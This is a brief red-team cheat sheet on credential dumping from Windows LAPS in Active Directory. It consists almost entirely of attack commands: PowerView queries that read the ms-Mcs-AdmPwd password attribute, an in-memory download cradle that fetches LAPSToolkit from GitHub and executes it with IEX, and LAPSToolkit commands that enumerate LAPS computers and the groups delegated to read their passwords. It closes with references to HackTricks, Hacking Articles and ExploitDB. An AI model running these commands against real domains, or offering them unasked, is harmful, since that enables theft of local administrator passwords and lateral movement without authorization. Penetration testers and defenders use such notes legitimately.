# Scripts

## PowerSploit

```
PS C:\> Import-Module .\PowerView.ps1
```

Retrieve password.

```
PS C:\> Get-DomainObject -Identity <IP> -Properties ms-Mcs-AdmPwd
```

## LAPSToolkit

Download cradle through memory.

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1')
```

```
PS C:\> Get-LAPSComputers
```

```
PS C:\> Find-LAPSDelegatedGroups
```

```
PS C:\> Find-AdmPwdExtendedRights
```

---
## References

### Github

- [leoloobeek: LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

### Hacktricks

- [Hacktricks: LAPS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

### Hacking Articles

- [Hacking Articles: Credential Dumping - LAPS](https://www.hackingarticles.in/credential-dumpinglaps/)

### ExploitDB

- [Exploit DB: Abusing LAPS](https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf)